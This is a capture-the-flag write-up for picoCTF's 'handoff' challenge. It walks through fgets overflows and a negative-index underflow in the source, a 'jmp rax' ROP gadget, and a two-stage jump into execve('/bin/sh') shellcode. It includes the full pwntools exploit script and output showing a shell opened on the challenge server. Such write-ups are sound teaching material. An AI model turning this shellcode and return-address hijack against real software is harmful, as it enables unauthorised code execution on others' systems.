# handoff #
 
## Overview ##

400 points

Category: [Binary Exploitation](../)

Tags: `#binaryexploitation #bufferoverflow #writewhatwhere #ASLR #ROP #gadget`

## Description ##

Download the binary here
Download the source here
Connect to the program with netcat: `$ nc <server> <port>`

## Approach ##

Analysing the provided challenge `handoff.c` source file, a number of issues with bounds checking were identified.

1. Menu item "`1. Add a new recipient`" contains a potential buffer overflow condition.

      ```
      #define NAME_LEN 32

      typedef struct entry {
        char name[8];
        char msg[64];
      } entry_t;

      // Add a new entry
      puts("What's the new recipient's name: ");
      fflush(stdin);
      fgets(entries[total_entries].name, NAME_LEN, stdin);
      total_entries++;
      ```

  The `fgets()` size parameter `NAME_LEN` allows for `32` bytes to be written (-1 for null termination), as the target store `entry_t.name` is `8` bytes in size.

2. Menu item "`2. Send a message to a recipient`" contains a potential buffer underflow condition.

      ```
      else if (choice == 2) {
        choice = -1;
        puts("Which recipient would you like to send a message to?");
        if (scanf("%d", &choice) != 1) exit(0);
        getchar();

        if (choice >= total_entries) {
          puts("Invalid entry number");
          continue;
        }

        puts("What message would you like to send them?");
        fgets(entries[choice].msg, MSG_LEN, stdin); 
      ```       

  The bounds checking to ensure the `choice` is a valid entry that exists, checks only the upper limit (how many entries exist), the user can enter a negative number and satisfy the `(choice >= total_entries)` condition, underflowing the `entries[]` array. We can underflow this buffer by a significant distance with large negative numbers and given this operates within a loop, spray data over a large range (not without some fragmentation - the `name[]` buffer of `entry_t` between successive `msg` structures).

3. Lastly, menu item "`3. Exit the app`" contains a potential buffer overflow condition, similar to (1).

      ```
      #define NAME_LEN 32

      char feedback[8];

      else if (choice == 3) {
        choice = -1;
        puts("Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it: ");
        fgets(feedback, NAME_LEN, stdin);
        feedback[7] = '\0';
        break;
      }
      ```

  The `fgets()` size parameter `NAME_LEN` allows for `32` bytes to be written (-1 for null termination), where the `feedback` buffer is only `8` bytes in size. An important note with this overflow is that our buffer doesn't survive completely unmolested, with a null termination character being written over our input via the `feedback[7] = '\0';` statement.

Checking `handoff` binary security:

    $ checksec handoff
    [*] '/home/user/picoCTF/handoff/handoff'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX disabled
        PIE:      No PIE (0x400000)
        RWX:      Has RWX segments

Non-PIE, allows for usage of fixed code addresses.
The stack isn't protected either via canaries or preventing code execution.

Given the simple nature of the binary and the unprotected stack, this led me towards trying to construct shellcode to `execv()` a shell and jump to this code via a patched return address.

Inspecting the binary segments, for any other target areas didn't find too much of interest:

    $ readelf -l handoff

    Elf file type is EXEC (Executable file)
    Entry point 0x401110
    There are 13 program headers, starting at offset 64

    Program Headers:
      Type           Offset             VirtAddr           PhysAddr
                     FileSiz            MemSiz              Flags  Align
      PHDR           0x0000000000000040 0x0000000000400040 0x0000000000400040
                     0x00000000000002d8 0x00000000000002d8  R      0x8
      INTERP         0x0000000000000318 0x0000000000400318 0x0000000000400318
                     0x000000000000001c 0x000000000000001c  R      0x1
          [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
      LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000
                     0x00000000000006c0 0x00000000000006c0  R      0x1000
      LOAD           0x0000000000001000 0x0000000000401000 0x0000000000401000
                     0x00000000000004d5 0x00000000000004d5  R E    0x1000
      LOAD           0x0000000000002000 0x0000000000402000 0x0000000000402000
                     0x0000000000000360 0x0000000000000360  R      0x1000
      LOAD           0x0000000000002e10 0x0000000000403e10 0x0000000000403e10
                     0x0000000000000250 0x0000000000000270  RW     0x1000
      DYNAMIC        0x0000000000002e20 0x0000000000403e20 0x0000000000403e20
                     0x00000000000001d0 0x00000000000001d0  RW     0x8
      NOTE           0x0000000000000338 0x0000000000400338 0x0000000000400338
                     0x0000000000000020 0x0000000000000020  R      0x8
      NOTE           0x0000000000000358 0x0000000000400358 0x0000000000400358
                     0x0000000000000044 0x0000000000000044  R      0x4
      GNU_PROPERTY   0x0000000000000338 0x0000000000400338 0x0000000000400338
                     0x0000000000000020 0x0000000000000020  R      0x8
      GNU_EH_FRAME   0x00000000000021c8 0x00000000004021c8 0x00000000004021c8
                     0x0000000000000054 0x0000000000000054  R      0x4
      GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                     0x0000000000000000 0x0000000000000000  RWE    0x10
      GNU_RELRO      0x0000000000002e10 0x0000000000403e10 0x0000000000403e10
                     0x00000000000001f0 0x00000000000001f0  R      0x1

Disassembling the binary and analysing:

    $ objdump -M intel -d valley > objdump_valley.txt

We can construct the stack layout within the `vuln()` function, called by `main()` with the location of local variables and important bits from the previous stack frame. I find it easier to scribble these things out to better visualise the data and its layout.

                             (top of the stack)
                      |                             |
                      |-----------------------------|
           $rbp-0x2e4 |           choice            |
                      |-----------------------------|
           $rbp-0x2e0 |      entries[0].name[]      |
                      |   ----------------------    |
           $rbp-0x2d8 |      entries[0].msg[]       |
                      |-----------------------------|
                      |             .               |
                      |             .               |
                      |                             |
                      |      entries[1..9]          |
                      |             .               |
                      |             .               |
                      |-----------------------------|
           $rbp-0x0c  |         feedback[]          |
                      |-----------------------------|
           $rbp-0x04  |       total_entries         |
                      |-----------------------------|
           $rbp       |  Saved $rbp (main() frame)--|----+
                      ===============================    |
                      | Return address (<main+18>)  |    |
                      |-----------------------------|    |
                      |                             |<---+

At this point I got stuck for quite a while, as I came to the realisation that I didn't yet have any form of infoleak to deal with the assumption that we would be operating under Address Space Layout Randomisation (ASLR) and I had no clue of the absolute addresses of where these were within the address space as a result. Which would be required to construct the shellcode (pointer to `"/bin/sh\0"`) and in particular the jump target to this shellcode. ASLR with 64-bit provides too much area for an effective `NOP`-sled approach, despite our underflow being able to cover lots of range (again, with holes, which doesn't help).

Eventually I decided to carefully analyse the register states after completion of the various menu item code blocks, to see if there was any information left around in registers that I could leverage.

I found in all three cases `$rax` was left intact and pointing to the respective target buffers of interest. 

    Breakpoints of interest:
      - 0x40126c    = return from scanf(choice)
      - 0x4012f8    = return from fgets(name)     [choice = 1]
      - 0x4013b1    = return from fgets(message)  [choice = 2]
      - 0x4013ed    = return from fgets(feedback) [choice = 3]

    Registers of interest at the above breakpoints;
      1. $rdi = &choice
      2. $rax = entries[total_entries].name
      3. $rax = entries[total_entries].message
      4. $rax = feedback

Which led me to start looking at available ROP gadgets utilising `$rax`, with these in particular catching my eye - we could call or jump directly to our target buffer:

    $ ROPgadget --binary handoff | grep rax
    ...
    0x0000000000401014 : call rax
    0x000000000040116c : jmp rax

### Plan of Attack ###

With the mechanism now understood, it was time to devise a plan of attack, which took many iterations, but my final solution was:

1. create an entry using menu item (1), the contents of `name` is not important, this is really just so we have a valid entry to then use menu item (2).
2. use menu item (2) to write a message, this is where we will construct our shellcode (`entries[0].msg)`, as we have plenty of space (64 bytes) and no need to use a buffer overflow or underflows.
3. use menu item (3) to exit `vuln()` but firstly overflowing the `feeedback` buffer to hijack the return address using our `jmp rax` gadget at `0x40116c` and following a series of jumps until we get to the shellcode.

The astute may already be wondering if `$rax` points to our `feedback` buffer as a result of using menu item (3), how are we going to get to our shellcode up in `entries[0].msg`? This took some fiddling around, but the answer was to use `feedback` as a place to construct another jump up to our shellcode, as the offset between `feedback` and `entries[0].msg` doesn't change, just the entire stack moves around with ASLR.

But why go to all this trouble of extra jumps? Why not just put the shellcode within `feedback` and be done with it. Space limitations mainly and the fact the 8'th byte gets overwritten with a null termination byte complicates things.

### Implementation ###

Starting the explanation with step 3, above - the overflow of `feedback`. The construction of this overflow has two core goals;

- replace the `vuln()` return address with our `jmp $rax` ROP gadget address, which is just a known absolute address we put in our payload (No PIE).
- construct another jump from within this area to our shellcode. This was done knowing the value of `$rax` was currently pointing to `feedback` (at `$rbp-0x0c`) and we want to jump to `entries[0].msg[]` (at `$rbp-0x2d8`). So a simple subtraction from `$rax` we can then execute another `jmp $rax` to reach our shellcode. 

These two instructions (sub $rax, and jmp $rax) were 8 bytes. But `feedback[7]` gets overwritten with that null termination character, overwriting the last byte of our second opcode!

So what I ended up doing was having another relative jump at the start of `feedback`, that jumped to these two instructions that I ended up within `total_entries` location.

So the final `feedback` payload structure looks like:

    <JMP 0x6><NOP x6 (padding)><SUB $RAX, 0x2CC><JMP $RAX><'AAAA' padding><JMP_RAX_ROP_GADGET_ADDRESS>

Refer to the stack layout diagram above for how this overlays the stack locals and return address and the padding required to align this.

The shellcode constructed for step 2, above - for the `entry[0]` message payload is fairly run of the mill.

    shellcode = asm("""
      mov rdi, rax
      add rdi, (64 - 9)
      mov rax, 59
      xor rsi, rsi
      xor rdx, rdx
      syscall
      mov rax, 0x40143f
      jmp rax
      """, arch = 'amd64')

So the final `entry[0]` message payload structure looks like:

    <shellcode><NOP padding><"/bin/sh\0" string>

We just use the fact the buffer is a total of 64 bytes, place our `"/bin/sh\0
"` string at the bottom of this and knowing `$rax` points to the start of our shellcode at `entries[0].msg` we can calculate `$rdi` accordingly (pointer to command string to execute).

To clean up after executing the shell, I added a jump to `<main+48>` (at `0x40143f`) to exit the challenge binary in a slightly more orderly fashion.

All of this in practice results in the following jump structure, the flow identified through steps (a) through to (d):

                              (.text code segment)
                                     .
                      |              .                |
                      |-------------------------------|
            +-------->|            JMP $RAX           | 0x40116c
            |    +----|--*     ( our ROP gadget )     |
            |    |    |-------------------------------|
            |    |    |              .                |
            |   (b)                  .
            |    |
            |    |
            |    |
            |    |            (top of the stack)
            |    |    |                               |
            |    |    |-------------------------------|
            |    |    |            choice             |
            |    |    |-------------------------------|
            |    |    |       entries[0].name[]       |
            |    |    |   ------------------------    |
            |    |    |       entries[0].msg[]        |<-------+
            |    |    |                               |        |
            |    |    |       { our shellcode }       |        |
            |    |    |                               |        |
            |    |    |-------------------------------|        |
            |    |    |              .                |        |
            |    |    |              .                |        |
            |    |    |       entries[1..9]           |        |
            |    |    |              .                |        |
            |    |    |              .                |        |
            |    |    |-------------------------------|        |
            |    +--->|         feedback[]            |        |
            |  +--(c)-|-JMP re|   |   |   |   |   | 0 |        |
            |  |      |-------------------------------|        |
            |  +----->|        total_entries          |        |
            |         | SUB EAX, 0x2CC    | JMP $RAX--|--(d)---+
            |         |-------------------------------|     
            |         |   Saved $rbp (main() frame)   |     
            |         =================================     
            +---(a)---|--*     Return address         |     
                      |-------------------------------|    
                      |                               |

Note that the `Saved $rbp` entry at `$rbp` does get clobbered by the code added at `total_entries` as this required 8 bytes for the two instructions (SUB and JMP) and `total_entries` is only 4 bytes. But we don't need to worry about preserving `main()`'s stack frame so much anyway.

## Solution ##

The [pwntools](https://docs.pwntools.com/en/stable/) script I used that during the event:

    #!/usr/bin/env python3

    from pwn import *

    target_elf = ELF("./handoff")

    # command line support for local, remote and gdb modes
    if len(sys.argv) > 1:
      if "remote" in sys.argv:
        if len(sys.argv) > 3:
          target_proc = remote(sys.argv[2], sys.argv[3])
        else:
          print('usage: ./pwn-game.py remote <server> <port>')
          exit(1)
      elif "gdb" in sys.argv:
        target_proc = target_elf.process()
        gdb.attach(target_proc)
    else:
      target_proc = target_elf.process()


    # add an entry (name = NOP sled)
    target_proc.recvuntil(b'3. Exit the app\n')
    target_proc.sendline(b'1');
    target_proc.recvuntil(b'What\'s the new recipient\'s name:')
    target_proc.sendline(b'\x90' * 30)

    # write a message with our shellcode, for entries[0]
    target_proc.recvuntil(b'3. Exit the app\n')
    target_proc.sendline(b'2');
    target_proc.recvuntil(b'Which recipient would you like to send a message to?')
    target_proc.sendline(b'0')
    target_proc.recvuntil(b'What message would you like to send them?')
    random_shellcode = asm("""
      mov rdi, rax
      add rdi, (64 - 9)
      mov rax, 59
      xor rsi, rsi
      xor rdx, rdx
      syscall
      mov rax, 0x40143f
      jmp rax
      """, arch = 'amd64')
    print('shellcode = ' + str(len(random_shellcode)) + ' bytes')
    random_shellcode += b'\x90'*(64-9-len(random_shellcode))
    random_shellcode += b'/bin/sh\x00'
    target_proc.sendline(random_shellcode)

    # overflow feedback
    target_proc.recvuntil(b'3. Exit the app\n')
    target_proc.sendline(b'3')
    payload = b'\xeb\x06' + b'\x90'*6   # jmp to <total_entries>
    payload += asm("""
      sub rax, (0x2D4 - 8)              
      jmp rax                           
     """, arch = 'amd64')
    # $rax=<feedback> sub to get to <entries[0].message>
    # jump to our shellcode
    payload += b'A'*4 + p64(0x40116c) # pad remainder of saved rbp, set ret to "jmp rax" gadget
    print(len(payload))
    target_proc.sendline(payload)

    target_proc.interactive()

The resulting output from running against the challenge server:

    $ ./pwn-handoff.py remote shape-facility.picoctf.net 57964
    [*] '/home/user/picoCTF/handoff/handoff'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX disabled
        PIE:      No PIE (0x400000)
        RWX:      Has RWX segments
    [+] Opening connection to shape-facility.picoctf.net on port 57964: Done
    shellcode = 31 bytes
    28
    [*] Switching to interactive mode
    Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it: 
    $ ls
    flag.txt
    handoff
    start.sh
    $ cat flag.txt
    picoCTF{...........redacted.............}$ 
    $ exit
    [*] Got EOF while reading in interactive
    [*] Interrupted
    [*] Closed connection to shape-facility.picoctf.net port 57964

Where the actual flag value has been redacted for the purposes of this write up.
